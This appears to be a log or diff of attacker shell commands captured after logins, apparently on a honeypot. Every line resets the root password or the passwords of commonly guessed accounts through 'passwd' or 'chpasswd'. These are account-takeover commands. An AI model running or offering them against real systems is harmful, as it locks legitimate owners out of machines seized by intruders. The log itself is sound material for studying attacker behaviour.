+echo "root:1FlTrvhfWaDJ"|chpasswd|bash
+echo "root:PNlbUTF4jff0"|chpasswd|bash
+echo -e "dekait123\nxo3LtP7wAzgg\nxo3LtP7wAzgg"|passwd|bash
+echo -e "ctejedor\nNGSA8Uv2jiUw\nNGSA8Uv2jiUw"|passwd|bash
+echo "dekait123\nxo3LtP7wAzgg\nxo3LtP7wAzgg\n"|passwd
+echo "ctejedor\nNGSA8Uv2jiUw\nNGSA8Uv2jiUw\n"|passwd
+echo -e "ctejedor\nakz9cLgL5fvh\nakz9cLgL5fvh"|passwd|bash
+echo -e "simon123\n0FTKMjh81gCN\n0FTKMjh81gCN"|passwd|bash
+echo "ctejedor\nakz9cLgL5fvh\nakz9cLgL5fvh\n"|passwd
+echo "simon123\n0FTKMjh81gCN\n0FTKMjh81gCN\n"|passwd
+echo -e "simon123\nq9KeFEwOI2g2\nq9KeFEwOI2g2"|passwd|bash
+echo "simon123\nq9KeFEwOI2g2\nq9KeFEwOI2g2\n"|passwd
+echo -e "Pa$$w0rd\nj1JALOk0WWxr\nj1JALOk0WWxr"|passwd|bash
+echo "root:PxlaluGL2srf"|chpasswd|bash
+echo "Pa$$w0rd\nj1JALOk0WWxr\nj1JALOk0WWxr\n"|passwd
+echo -e "nuwanthi\nOGpRuWulukI7\nOGpRuWulukI7"|passwd|bash
+echo -e "wangyifa\nkdXq964kSazb\nkdXq964kSazb"|passwd|bash
+echo -e "celery\nnYSzNBpSSWp8\nnYSzNBpSSWp8"|passwd|bash
+echo "nuwanthi\nOGpRuWulukI7\nOGpRuWulukI7\n"|passwd
+echo "wangyifa\nkdXq964kSazb\nkdXq964kSazb\n"|passwd
+echo "celery\nnYSzNBpSSWp8\nnYSzNBpSSWp8\n"|passwd
+echo -e "concretyourdev\nnA6xZ0mpWYvK\nnA6xZ0mpWYvK"|passwd|bash
+echo -e "compta\nGSKNeFNSGCbt\nGSKNeFNSGCbt"|passwd|bash
+echo -e "nuwanthi\nGSKNeFNSGCbt\nGSKNeFNSGCbt"|passwd|bash
+echo "concretyourdev\nnA6xZ0mpWYvK\nnA6xZ0mpWYvK\n"|passwd
+echo "compta\nGSKNeFNSGCbt\nGSKNeFNSGCbt\n"|passwd
+echo "nuwanthi\nGSKNeFNSGCbt\nGSKNeFNSGCbt\n"|passwd
+echo -e "taoyao\nZaS3HtWQzcWQ\nZaS3HtWQzcWQ"|passwd|bash
+echo -e "1234\nPTegwUAlb8jq\nPTegwUAlb8jq"|passwd|bash
+echo -e "administrator12\nkXyPxpPsdLW7\nkXyPxpPsdLW7"|passwd|bash
+echo -e "ultra\nZaS3HtWQzcWQ\nZaS3HtWQzcWQ"|passwd|bash
+echo "taoyao\nZaS3HtWQzcWQ\nZaS3HtWQzcWQ\n"|passwd
+echo -e "wangyifa\nqYRrPcdaz2iX\nqYRrPcdaz2iX"|passwd|bash
+echo "administrator12\nkXyPxpPsdLW7\nkXyPxpPsdLW7\n"|passwd
+echo -e "encargados\nXuAM1XUndxsi\nXuAM1XUndxsi"|passwd|bash
+echo -e "concretyourdev\njb417tX3w3Ph\njb417tX3w3Ph"|passwd|bash
+echo "1234\nPTegwUAlb8jq\nPTegwUAlb8jq\n"|passwd
+echo "ultra\nZaS3HtWQzcWQ\nZaS3HtWQzcWQ\n"|passwd
+echo "wangyifa\nqYRrPcdaz2iX\nqYRrPcdaz2iX\n"|passwd
+echo -e "celery\nRjnpeA6AzJmQ\nRjnpeA6AzJmQ"|passwd|bash
+echo -e "gem\ni3qrTBBjG2gs\ni3qrTBBjG2gs"|passwd|bash
+echo "encargados\nXuAM1XUndxsi\nXuAM1XUndxsi\n"|passwd
+echo "concretyourdev\njb417tX3w3Ph\njb417tX3w3Ph\n"|passwd
+echo "celery\nRjnpeA6AzJmQ\nRjnpeA6AzJmQ\n"|passwd
+echo -e "encargados\n8YRu1gEitwmN\n8YRu1gEitwmN"|passwd|bash
+echo "gem\ni3qrTBBjG2gs\ni3qrTBBjG2gs\n"|passwd
+echo "root:8YRu1gEitwmN"|chpasswd|bash
+echo "encargados\n8YRu1gEitwmN\n8YRu1gEitwmN\n"|passwd
+echo -e "eko\ngK7Jj1VmhXT8\ngK7Jj1VmhXT8"|passwd|bash
+echo -e "carla\nD78awoF5bWMw\nD78awoF5bWMw"|passwd|bash
+echo "eko\ngK7Jj1VmhXT8\ngK7Jj1VmhXT8\n"|passwd
+echo "carla\nD78awoF5bWMw\nD78awoF5bWMw\n"|passwd
+echo "root:96rnLkvzzIir"|chpasswd|bash
+echo -e "encargados\nD6Kg3U8NfvnB\nD6Kg3U8NfvnB"|passwd|bash
+echo "encargados\nD6Kg3U8NfvnB\nD6Kg3U8NfvnB\n"|passwd
+echo -e "encargados\nZbyNpbKUyMfi\nZbyNpbKUyMfi"|passwd|bash
+echo -e "123123123\nozjxL4cDamAT\nozjxL4cDamAT"|passwd|bash
+echo -e "simon123\nXUBqKdbjuCaQ\nXUBqKdbjuCaQ"|passwd|bash
+echo "encargados\nZbyNpbKUyMfi\nZbyNpbKUyMfi\n"|passwd
+echo "root:Jw2FbRLzgZwa"|chpasswd|bash
+echo -e "ali123\nozjxL4cDamAT\nozjxL4cDamAT"|passwd|bash
+echo "123123123\nozjxL4cDamAT\nozjxL4cDamAT\n"|passwd
+echo -e "kruwaraporn\nJw2FbRLzgZwa\nJw2FbRLzgZwa"|passwd|bash
+echo -e "kruwaraporn\nNTqJt4ZmA1hr\nNTqJt4ZmA1hr"|passwd|bash
+echo -e "wangyifa\nNTqJt4ZmA1hr\nNTqJt4ZmA1hr"|passwd|bash
+echo -e "testing123\nAeoiAHmarrJu\nAeoiAHmarrJu"|passwd|bash
+echo -e "renatav\ndj6kTfBtiQZ9\ndj6kTfBtiQZ9"|passwd|bash
+echo -e "germ280fact848\ndj6kTfBtiQZ9\ndj6kTfBtiQZ9"|passwd|bash
+echo -e "www\nzPELFoei1t3P\nzPELFoei1t3P"|passwd|bash
+echo -e "xing\nJ7Crw0VR62Hh\nJ7Crw0VR62Hh"|passwd|bash
+echo "simon123\nXUBqKdbjuCaQ\nXUBqKdbjuCaQ\n"|passwd
+echo "ali123\nozjxL4cDamAT\nozjxL4cDamAT\n"|passwd
+echo "kruwaraporn\nNTqJt4ZmA1hr\nNTqJt4ZmA1hr\n"|passwd
+echo "wangyifa\nNTqJt4ZmA1hr\nNTqJt4ZmA1hr\n"|passwd
+echo "testing123\nAeoiAHmarrJu\nAeoiAHmarrJu\n"|passwd
+echo "renatav\ndj6kTfBtiQZ9\ndj6kTfBtiQZ9\n"|passwd
+echo "germ280fact848\ndj6kTfBtiQZ9\ndj6kTfBtiQZ9\n"|passwd
+echo "www\nzPELFoei1t3P\nzPELFoei1t3P\n"|passwd
+echo "kruwaraporn\nJw2FbRLzgZwa\nJw2FbRLzgZwa\n"|passwd
+echo -e "care\nhNlWQie6LRwX\nhNlWQie6LRwX"|passwd|bash
+echo "xing\nJ7Crw0VR62Hh\nJ7Crw0VR62Hh\n"|passwd
+echo -e "care\nnKubxACU8kDl\nnKubxACU8kDl"|passwd|bash
+echo -e "ali123\nlW1jPUTyj7Of\nlW1jPUTyj7Of"|passwd|bash
+echo "care\nnKubxACU8kDl\nnKubxACU8kDl\n"|passwd
+echo "care\nhNlWQie6LRwX\nhNlWQie6LRwX\n"|passwd
+echo -e "wangyifa\nx4UGxcFO400b\nx4UGxcFO400b"|passwd|bash
+echo "ali123\nlW1jPUTyj7Of\nlW1jPUTyj7Of\n"|passwd
+echo -e "andreas\nUzdHcs8rbn9l\nUzdHcs8rbn9l"|passwd|bash
+echo "wangyifa\nx4UGxcFO400b\nx4UGxcFO400b\n"|passwd
+echo -e "ali123\n6GsvjbNMVU1q\n6GsvjbNMVU1q"|passwd|bash
+echo "andreas\nUzdHcs8rbn9l\nUzdHcs8rbn9l\n"|passwd
+echo "ali123\n6GsvjbNMVU1q\n6GsvjbNMVU1q\n"|passwd
+echo -e "kruwaraporn\n30NKKoa2Gb0J\n30NKKoa2Gb0J"|passwd|bash
+echo "kruwaraporn\n30NKKoa2Gb0J\n30NKKoa2Gb0J\n"|passwd
+echo -e "password\nEZUb2K75qM3b\nEZUb2K75qM3b"|passwd|bash
+echo -e "reu\nHYOIpA7Nnkwr\nHYOIpA7Nnkwr"|passwd|bash
+echo -e "care\nHYOIpA7Nnkwr\nHYOIpA7Nnkwr"|passwd|bash
+echo "password\nEZUb2K75qM3b\nEZUb2K75qM3b\n"|passwd
+echo "reu\nHYOIpA7Nnkwr\nHYOIpA7Nnkwr\n"|passwd
+echo "care\nHYOIpA7Nnkwr\nHYOIpA7Nnkwr\n"|passwd
+echo -e "celery\nv9mTykGMobU8\nv9mTykGMobU8"|passwd|bash
+echo "celery\nv9mTykGMobU8\nv9mTykGMobU8\n"|passwd
+echo -e "huyhq\n1RaGHdxRtH1R\n1RaGHdxRtH1R"|passwd|bash
+echo -e "encargados\ngizEraUvpNdY\ngizEraUvpNdY"|passwd|bash
+echo -e "Lalo\noLU1N8iD4Pc0\noLU1N8iD4Pc0"|passwd|bash
+echo -e "Pa$$w0rd\noLU1N8iD4Pc0\noLU1N8iD4Pc0"|passwd|bash
+echo -e "mysql123\noLU1N8iD4Pc0\noLU1N8iD4Pc0"|passwd|bash
+echo -e "amy\n9mn0AhY4aXL4\n9mn0AhY4aXL4"|passwd|bash
+echo -e "pers\noPBxA3eaDgVm\noPBxA3eaDgVm"|passwd|bash
+echo -e "jeus\nx9ZYX7bPmQnR\nx9ZYX7bPmQnR"|passwd|bash
+echo -e "michaelwilson\n23RvqHIEKomo\n23RvqHIEKomo"|passwd|bash
+echo "root:xnux8mlWCAte"|chpasswd|bash
+echo "encargados\ngizEraUvpNdY\ngizEraUvpNdY\n"|passwd
+echo -e "kruwaraporn\ngizEraUvpNdY\ngizEraUvpNdY"|passwd|bash
+echo "huyhq\n1RaGHdxRtH1R\n1RaGHdxRtH1R\n"|passwd
+echo -e "p@ssword\nOgncG0nuS5E1\nOgncG0nuS5E1"|passwd|bash
+echo -e "adept\nLZZUT3qgNaQA\nLZZUT3qgNaQA"|passwd|bash
+echo "Lalo\noLU1N8iD4Pc0\noLU1N8iD4Pc0\n"|passwd
+echo "Pa$$w0rd\noLU1N8iD4Pc0\noLU1N8iD4Pc0\n"|passwd
+echo "mysql123\noLU1N8iD4Pc0\noLU1N8iD4Pc0\n"|passwd
+echo "amy\n9mn0AhY4aXL4\n9mn0AhY4aXL4\n"|passwd
+echo "pers\noPBxA3eaDgVm\noPBxA3eaDgVm\n"|passwd
+echo "jeus\nx9ZYX7bPmQnR\nx9ZYX7bPmQnR\n"|passwd
+echo "michaelwilson\n23RvqHIEKomo\n23RvqHIEKomo\n"|passwd
+echo -e "ts3server\nVPmA9qXQJIum\nVPmA9qXQJIum"|passwd|bash
+echo -e "huyhq\n51FuFvzPsWqx\n51FuFvzPsWqx"|passwd|bash
+echo -e "1q2w3e\nCKd8K18kmpJM\nCKd8K18kmpJM"|passwd|bash
+echo "kruwaraporn\ngizEraUvpNdY\ngizEraUvpNdY\n"|passwd
+echo "root:Js9xsqm3lOPA"|chpasswd|bash
+echo "p@ssword\nOgncG0nuS5E1\nOgncG0nuS5E1\n"|passwd
+echo "adept\nLZZUT3qgNaQA\nLZZUT3qgNaQA\n"|passwd
+echo -e "matias\nxnux8mlWCAte\nxnux8mlWCAte"|passwd|bash
+echo "root:ohb95XhZ87sR"|chpasswd|bash
+echo "1q2w3e\nCKd8K18kmpJM\nCKd8K18kmpJM\n"|passwd
+echo "ts3server\nVPmA9qXQJIum\nVPmA9qXQJIum\n"|passwd
+echo -e "wirat\nkxXSJEw8lILQ\nkxXSJEw8lILQ"|passwd|bash
+echo -e "iakovidis\nLdpwv4jC8MZT\nLdpwv4jC8MZT"|passwd|bash
+echo -e "rashid\nVa93Zc0MwOkA\nVa93Zc0MwOkA"|passwd|bash
+echo "huyhq\n51FuFvzPsWqx\n51FuFvzPsWqx\n"|passwd
+echo "matias\nxnux8mlWCAte\nxnux8mlWCAte\n"|passwd
+echo "wirat\nkxXSJEw8lILQ\nkxXSJEw8lILQ\n"|passwd
+echo "iakovidis\nLdpwv4jC8MZT\nLdpwv4jC8MZT\n"|passwd
+echo "rashid\nVa93Zc0MwOkA\nVa93Zc0MwOkA\n"|passwd
+echo -e "123456\nbmw9c1qZfbzm\nbmw9c1qZfbzm"|passwd|bash
+echo "123456\nbmw9c1qZfbzm\nbmw9c1qZfbzm\n"|passwd
+echo -e "wirat\nXPtHr9UL0Owc\nXPtHr9UL0Owc"|passwd|bash
+echo "root:NqA79fPuztPa"|chpasswd|bash
+echo "wirat\nXPtHr9UL0Owc\nXPtHr9UL0Owc\n"|passwd
+echo -e "wirat\nmAwPS9ov8gpv\nmAwPS9ov8gpv"|passwd|bash
+echo -e "doule\nxg63BkJjj867\nxg63BkJjj867"|passwd|bash
+echo -e "mercaderista\nusWx6Bi4z3Qa\nusWx6Bi4z3Qa"|passwd|bash
+echo "wirat\nmAwPS9ov8gpv\nmAwPS9ov8gpv\n"|passwd
+echo "root:VrVui0DupH6Y"|chpasswd|bash
+echo "doule\nxg63BkJjj867\nxg63BkJjj867\n"|passwd
+echo "mercaderista\nusWx6Bi4z3Qa\nusWx6Bi4z3Qa\n"|passwd
+echo -e "12345\nxzIVLXApeATY\nxzIVLXApeATY"|passwd|bash
+echo -e "11\nxzIVLXApeATY\nxzIVLXApeATY"|passwd|bash
+echo -e "nuwanthi\nxzIVLXApeATY\nxzIVLXApeATY"|passwd|bash
+echo -e "presto\nxzIVLXApeATY\nxzIVLXApeATY"|passwd|bash
+echo -e "presto\nqqXlSrR3Fl9j\nqqXlSrR3Fl9j"|passwd|bash
+echo -e "123456\nqqXlSrR3Fl9j\nqqXlSrR3Fl9j"|passwd|bash
+echo -e "sale\nqqXlSrR3Fl9j\nqqXlSrR3Fl9j"|passwd|bash
+echo -e "mercaderista\nHbDBo6vu6kZm\nHbDBo6vu6kZm"|passwd|bash
+echo "12345\nxzIVLXApeATY\nxzIVLXApeATY\n"|passwd
+echo "11\nxzIVLXApeATY\nxzIVLXApeATY\n"|passwd
+echo "nuwanthi\nxzIVLXApeATY\nxzIVLXApeATY\n"|passwd
+echo "presto\nxzIVLXApeATY\nxzIVLXApeATY\n"|passwd
+echo "presto\nqqXlSrR3Fl9j\nqqXlSrR3Fl9j\n"|passwd
+echo "123456\nqqXlSrR3Fl9j\nqqXlSrR3Fl9j\n"|passwd
+echo "sale\nqqXlSrR3Fl9j\nqqXlSrR3Fl9j\n"|passwd
+echo -e "jbquilla\nSaTLzM5sU11E\nSaTLzM5sU11E"|passwd|bash
+echo -e "333\nsuL7ao1Jm9r1\nsuL7ao1Jm9r1"|passwd|bash
+echo -e "jbquilla\nBAwyu2XY6yTZ\nBAwyu2XY6yTZ"|passwd|bash
+echo -e "1234\nSaTLzM5sU11E\nSaTLzM5sU11E"|passwd|bash
+echo -e "unifi\nSaTLzM5sU11E\nSaTLzM5sU11E"|passwd|bash
+echo "mercaderista\nHbDBo6vu6kZm\nHbDBo6vu6kZm\n"|passwd
+echo -e "bodega\nYe1IgfGbHRQu\nYe1IgfGbHRQu"|passwd|bash
+echo -e "doule\nnaejJsZbbwxx\nnaejJsZbbwxx"|passwd|bash
+echo -e "qbtuser\nnaejJsZbbwxx\nnaejJsZbbwxx"|passwd|bash
+echo "333\nsuL7ao1Jm9r1\nsuL7ao1Jm9r1\n"|passwd
+echo "jbquilla\nBAwyu2XY6yTZ\nBAwyu2XY6yTZ\n"|passwd
+echo "jbquilla\nSaTLzM5sU11E\nSaTLzM5sU11E\n"|passwd
+echo -e "taoyao\n1jKMEaMEtopG\n1jKMEaMEtopG"|passwd|bash
+echo -e "pers\n1jKMEaMEtopG\n1jKMEaMEtopG"|passwd|bash
+echo "1234\nSaTLzM5sU11E\nSaTLzM5sU11E\n"|passwd
+echo "unifi\nSaTLzM5sU11E\nSaTLzM5sU11E\n"|passwd
+echo -e "viewer\nfG7KM5xT0lMZ\nfG7KM5xT0lMZ"|passwd|bash
+echo -e "encargados\nnwBxBBWayn9j\nnwBxBBWayn9j"|passwd|bash
+echo -e "sale\nJgp1fH7Nbkc8\nJgp1fH7Nbkc8"|passwd|bash
+echo "doule\nnaejJsZbbwxx\nnaejJsZbbwxx\n"|passwd
+echo "bodega\nYe1IgfGbHRQu\nYe1IgfGbHRQu\n"|passwd
+echo "qbtuser\nnaejJsZbbwxx\nnaejJsZbbwxx\n"|passwd
+echo "taoyao\n1jKMEaMEtopG\n1jKMEaMEtopG\n"|passwd
+echo "pers\n1jKMEaMEtopG\n1jKMEaMEtopG\n"|passwd
+echo "viewer\nfG7KM5xT0lMZ\nfG7KM5xT0lMZ\n"|passwd
+echo "encargados\nnwBxBBWayn9j\nnwBxBBWayn9j\n"|passwd
+echo "sale\nJgp1fH7Nbkc8\nJgp1fH7Nbkc8\n"|passwd
+echo -e "huyhq\nvBor5KT26WfU\nvBor5KT26WfU"|passwd|bash
+echo "huyhq\nvBor5KT26WfU\nvBor5KT26WfU\n"|passwd
+echo -e "123456\ndLhZpZYPlmNd\ndLhZpZYPlmNd"|passwd|bash
+echo "123456\ndLhZpZYPlmNd\ndLhZpZYPlmNd\n"|passwd
+echo -e "estudioremoto\nemuoVGmVMACg\nemuoVGmVMACg"|passwd|bash
+echo -e "energy\ndtughDrPdKNt\ndtughDrPdKNt"|passwd|bash
+echo -e "noaccess\ndtughDrPdKNt\ndtughDrPdKNt"|passwd|bash
+echo -e "tanw\ndtughDrPdKNt\ndtughDrPdKNt"|passwd|bash
+echo -e "123456789\ndtughDrPdKNt\ndtughDrPdKNt"|passwd|bash
+echo -e "presto\nOJs7kkeZMYab\nOJs7kkeZMYab"|passwd|bash
+echo -e "ebook\ndtughDrPdKNt\ndtughDrPdKNt"|passwd|bash
+echo "energy\ndtughDrPdKNt\ndtughDrPdKNt\n"|passwd
+echo "noaccess\ndtughDrPdKNt\ndtughDrPdKNt\n"|passwd
+echo "estudioremoto\nemuoVGmVMACg\nemuoVGmVMACg\n"|passwd
+echo -e "encargados\ndCn3oVnc5Ycs\ndCn3oVnc5Ycs"|passwd|bash
+echo -e "encargados\nuilLhO5fJU4k\nuilLhO5fJU4k"|passwd|bash
+echo -e "ubuntu\nZSacBUmHSbJ2\nZSacBUmHSbJ2"|passwd|bash
+echo -e "123456789\nuilLhO5fJU4k\nuilLhO5fJU4k"|passwd|bash
+echo "tanw\ndtughDrPdKNt\ndtughDrPdKNt\n"|passwd
+echo "123456789\ndtughDrPdKNt\ndtughDrPdKNt\n"|passwd
+echo "presto\nOJs7kkeZMYab\nOJs7kkeZMYab\n"|passwd
+echo -e "franco\nKiakfHGJrzwn\nKiakfHGJrzwn"|passwd|bash
+echo -e "iakovidis\nNCsiQYc27RXY\nNCsiQYc27RXY"|passwd|bash
+echo "ebook\ndtughDrPdKNt\ndtughDrPdKNt\n"|passwd
+echo -e "simon123\nkpQ3TF8kqY32\nkpQ3TF8kqY32"|passwd|bash
+echo -e "renatav\nkpQ3TF8kqY32\nkpQ3TF8kqY32"|passwd|bash
+echo "encargados\nuilLhO5fJU4k\nuilLhO5fJU4k\n"|passwd
+echo "ubuntu\nZSacBUmHSbJ2\nZSacBUmHSbJ2\n"|passwd
+echo "123456789\nuilLhO5fJU4k\nuilLhO5fJU4k\n"|passwd
+echo "encargados\ndCn3oVnc5Ycs\ndCn3oVnc5Ycs\n"|passwd
+echo "franco\nKiakfHGJrzwn\nKiakfHGJrzwn\n"|passwd
+echo "simon123\nkpQ3TF8kqY32\nkpQ3TF8kqY32\n"|passwd
+echo "renatav\nkpQ3TF8kqY32\nkpQ3TF8kqY32\n"|passwd
+echo -e "reklame\nByXfsadSCwHp\nByXfsadSCwHp"|passwd|bash
+echo "iakovidis\nNCsiQYc27RXY\nNCsiQYc27RXY\n"|passwd
+echo -e "654321\nlTJ0MlcuEnTh\nlTJ0MlcuEnTh"|passwd|bash
+echo "reklame\nByXfsadSCwHp\nByXfsadSCwHp\n"|passwd
+echo "654321\nlTJ0MlcuEnTh\nlTJ0MlcuEnTh\n"|passwd
+echo -e "qwerty\nLXtV1HPGozW6\nLXtV1HPGozW6"|passwd|bash
+echo "qwerty\nLXtV1HPGozW6\nLXtV1HPGozW6\n"|passwd
+echo -e "encargados\nLslEgbucCBAA\nLslEgbucCBAA"|passwd|bash
+echo -e "andreas\nVYVGoJTNAXWG\nVYVGoJTNAXWG"|passwd|bash
+echo "encargados\nLslEgbucCBAA\nLslEgbucCBAA\n"|passwd
+echo "andreas\nVYVGoJTNAXWG\nVYVGoJTNAXWG\n"|passwd
+echo -e "renatav\neYtC5ULcQnjo\neYtC5ULcQnjo"|passwd|bash
+echo -e "nuwanthi\neYtC5ULcQnjo\neYtC5ULcQnjo"|passwd|bash
+echo -e "anicust\neYtC5ULcQnjo\neYtC5ULcQnjo"|passwd|bash
+echo "renatav\neYtC5ULcQnjo\neYtC5ULcQnjo\n"|passwd
+echo -e "tim123\nF6zhoPYOfkJu\nF6zhoPYOfkJu"|passwd|bash
+echo "root:F6zhoPYOfkJu"|chpasswd|bash
+echo -e "p@ssw0rd\nF6zhoPYOfkJu\nF6zhoPYOfkJu"|passwd|bash
+echo "nuwanthi\neYtC5ULcQnjo\neYtC5ULcQnjo\n"|passwd
+echo "anicust\neYtC5ULcQnjo\neYtC5ULcQnjo\n"|passwd
+echo "tim123\nF6zhoPYOfkJu\nF6zhoPYOfkJu\n"|passwd
+echo "p@ssw0rd\nF6zhoPYOfkJu\nF6zhoPYOfkJu\n"|passwd
+echo -e "1234\nQbAbFAGBJWje\nQbAbFAGBJWje"|passwd|bash
+echo -e "1234\nGax2IvjgqqVT\nGax2IvjgqqVT"|passwd|bash
+echo -e "simon123\nYxekYMrm58ja\nYxekYMrm58ja"|passwd|bash
+echo -e "www\nhQfPIM259coq\nhQfPIM259coq"|passwd|bash
+echo -e "coremail\nF11ahc7l785U\nF11ahc7l785U"|passwd|bash
+echo -e "mikem\nF11ahc7l785U\nF11ahc7l785U"|passwd|bash
+echo "1234\nQbAbFAGBJWje\nQbAbFAGBJWje\n"|passwd
+echo -e "wirat\nCPCwmey1qQWV\nCPCwmey1qQWV"|passwd|bash
+echo "1234\nGax2IvjgqqVT\nGax2IvjgqqVT\n"|passwd
+echo -e "1234567\nHFMEtCBVStsP\nHFMEtCBVStsP"|passwd|bash
+echo "simon123\nYxekYMrm58ja\nYxekYMrm58ja\n"|passwd
+echo "www\nhQfPIM259coq\nhQfPIM259coq\n"|passwd
+echo "coremail\nF11ahc7l785U\nF11ahc7l785U\n"|passwd
+echo "mikem\nF11ahc7l785U\nF11ahc7l785U\n"|passwd
+echo -e "wirat\n8NWiEsfiKGpl\n8NWiEsfiKGpl"|passwd|bash
+echo -e "ecs\nLuONileO5Xwn\nLuONileO5Xwn"|passwd|bash
+echo -e "123456789\nh5oMjmCn5uZs\nh5oMjmCn5uZs"|passwd|bash
+echo -e "renatav\nh5oMjmCn5uZs\nh5oMjmCn5uZs"|passwd|bash
+echo -e "named\nh5oMjmCn5uZs\nh5oMjmCn5uZs"|passwd|bash
+echo -e "mysql@123\n8NWiEsfiKGpl\n8NWiEsfiKGpl"|passwd|bash
+echo "root:BLT0WdXmRxkE"|chpasswd|bash
+echo -e "wirat\nHFMEtCBVStsP\nHFMEtCBVStsP"|passwd|bash
+echo -e "tim123\nh5oMjmCn5uZs\nh5oMjmCn5uZs"|passwd|bash
+echo "wirat\nCPCwmey1qQWV\nCPCwmey1qQWV\n"|passwd
+echo -e "admin123321\nzOVRvP5TmlPT\nzOVRvP5TmlPT"|passwd|bash
+echo "1234567\nHFMEtCBVStsP\nHFMEtCBVStsP\n"|passwd
+echo -e "mysql@123\nlmOZFxDcN1eH\nlmOZFxDcN1eH"|passwd|bash
+echo "wirat\n8NWiEsfiKGpl\n8NWiEsfiKGpl\n"|passwd
+echo "ecs\nLuONileO5Xwn\nLuONileO5Xwn\n"|passwd
+echo "123456789\nh5oMjmCn5uZs\nh5oMjmCn5uZs\n"|passwd
+echo "renatav\nh5oMjmCn5uZs\nh5oMjmCn5uZs\n"|passwd
+echo "named\nh5oMjmCn5uZs\nh5oMjmCn5uZs\n"|passwd
+echo "mysql@123\n8NWiEsfiKGpl\n8NWiEsfiKGpl\n"|passwd
+echo "tim123\nh5oMjmCn5uZs\nh5oMjmCn5uZs\n"|passwd
+echo "wirat\nHFMEtCBVStsP\nHFMEtCBVStsP\n"|passwd
+echo -e "123456\nZKoXoYSnJDIF\nZKoXoYSnJDIF"|passwd|bash
+echo "mysql@123\nlmOZFxDcN1eH\nlmOZFxDcN1eH\n"|passwd
+echo "admin123321\nzOVRvP5TmlPT\nzOVRvP5TmlPT\n"|passwd
+echo "123456\nZKoXoYSnJDIF\nZKoXoYSnJDIF\n"|passwd
+echo -e "gis\ntO4mZuS6mNpV\ntO4mZuS6mNpV"|passwd|bash
+echo -e "adept\nwXZQqwsTGXgJ\nwXZQqwsTGXgJ"|passwd|bash
+echo "gis\ntO4mZuS6mNpV\ntO4mZuS6mNpV\n"|passwd
+echo -e "123456\nwXZQqwsTGXgJ\nwXZQqwsTGXgJ"|passwd|bash
+echo -e "sistemas\nbQJlhvvKJgHY\nbQJlhvvKJgHY"|passwd|bash
+echo "adept\nwXZQqwsTGXgJ\nwXZQqwsTGXgJ\n"|passwd
+echo -e "jeus\nXs8yz2y9PwRy\nXs8yz2y9PwRy"|passwd|bash
+echo -e "mysql@123\nEheCkyLHlKeR\nEheCkyLHlKeR"|passwd|bash
+echo "123456\nwXZQqwsTGXgJ\nwXZQqwsTGXgJ\n"|passwd
+echo "sistemas\nbQJlhvvKJgHY\nbQJlhvvKJgHY\n"|passwd
+echo "jeus\nXs8yz2y9PwRy\nXs8yz2y9PwRy\n"|passwd
+echo "mysql@123\nEheCkyLHlKeR\nEheCkyLHlKeR\n"|passwd
+echo -e "123456\nDJnen5714avU\nDJnen5714avU"|passwd|bash
+echo -e "adept\nA5k113FTLzwn\nA5k113FTLzwn"|passwd|bash
+echo "root:DJnen5714avU"|chpasswd|bash
+echo -e "123456\nFxSlA2VxsD4t\nFxSlA2VxsD4t"|passwd|bash
+echo -e "marcob\nDJnen5714avU\nDJnen5714avU"|passwd|bash
+echo "123456\nDJnen5714avU\nDJnen5714avU\n"|passwd
+echo "adept\nA5k113FTLzwn\nA5k113FTLzwn\n"|passwd
+echo "123456\nFxSlA2VxsD4t\nFxSlA2VxsD4t\n"|passwd
+echo -e "123456\nGme3CynwfRLQ\nGme3CynwfRLQ"|passwd|bash
+echo "marcob\nDJnen5714avU\nDJnen5714avU\n"|passwd
+echo -e "fabi\nAVfAIpRg430r\nAVfAIpRg430r"|passwd|bash
+echo "123456\nGme3CynwfRLQ\nGme3CynwfRLQ\n"|passwd
+echo "root:AVfAIpRg430r"|chpasswd|bash
+echo -e "browser\nAVfAIpRg430r\nAVfAIpRg430r"|passwd|bash
+echo "fabi\nAVfAIpRg430r\nAVfAIpRg430r\n"|passwd
+echo -e "adept\nf05vqWWDakf7\nf05vqWWDakf7"|passwd|bash
+echo -e "ldap\nf05vqWWDakf7\nf05vqWWDakf7"|passwd|bash
+echo -e "adept\nFMxVTquPOmNq\nFMxVTquPOmNq"|passwd|bash
+echo "browser\nAVfAIpRg430r\nAVfAIpRg430r\n"|passwd
+echo -e "12\nJnCGCR2DVh4v\nJnCGCR2DVh4v"|passwd|bash
+echo -e "michaelwilson\nrxgZfyybOb8F\nrxgZfyybOb8F"|passwd|bash
+echo "adept\nf05vqWWDakf7\nf05vqWWDakf7\n"|passwd
+echo "ldap\nf05vqWWDakf7\nf05vqWWDakf7\n"|passwd
+echo "adept\nFMxVTquPOmNq\nFMxVTquPOmNq\n"|passwd
+echo -e "michaelwilson\nitYF74g661vX\nitYF74g661vX"|passwd|bash
+echo "12\nJnCGCR2DVh4v\nJnCGCR2DVh4v\n"|passwd
+echo "michaelwilson\nrxgZfyybOb8F\nrxgZfyybOb8F\n"|passwd
+echo -e "care\nYXnGBWEouxev\nYXnGBWEouxev"|passwd|bash
+echo -e "ncuser\nitYF74g661vX\nitYF74g661vX"|passwd|bash
+echo "michaelwilson\nitYF74g661vX\nitYF74g661vX\n"|passwd
+echo "care\nYXnGBWEouxev\nYXnGBWEouxev\n"|passwd
+echo "ncuser\nitYF74g661vX\nitYF74g661vX\n"|passwd
+echo -e "live\nXeYecpsS7BJO\nXeYecpsS7BJO"|passwd|bash
+echo "live\nXeYecpsS7BJO\nXeYecpsS7BJO\n"|passwd
+echo -e "live\nxCjczistGUjV\nxCjczistGUjV"|passwd|bash
+echo "live\nxCjczistGUjV\nxCjczistGUjV\n"|passwd
+echo -e "mysql@123\nZo0nc9MJZ2SM\nZo0nc9MJZ2SM"|passwd|bash
+echo -e "123456\nZo0nc9MJZ2SM\nZo0nc9MJZ2SM"|passwd|bash
+echo "mysql@123\nZo0nc9MJZ2SM\nZo0nc9MJZ2SM\n"|passwd
+echo "123456\nZo0nc9MJZ2SM\nZo0nc9MJZ2SM\n"|passwd
+echo -e "mysql@123\nSE9RMCZqnPaX\nSE9RMCZqnPaX"|passwd|bash
+echo "mysql@123\nSE9RMCZqnPaX\nSE9RMCZqnPaX\n"|passwd
+echo -e "fabi\nEr0EnPY2tpyE\nEr0EnPY2tpyE"|passwd|bash
+echo -e "mysql@123\n0Tlz3UvVSl7B\n0Tlz3UvVSl7B"|passwd|bash
+echo -e "michaelwilson\ne1nYKtmgejzf\ne1nYKtmgejzf"|passwd|bash
+echo -e "123456\nBRirH7VTzhb3\nBRirH7VTzhb3"|passwd|bash
+echo "fabi\nEr0EnPY2tpyE\nEr0EnPY2tpyE\n"|passwd
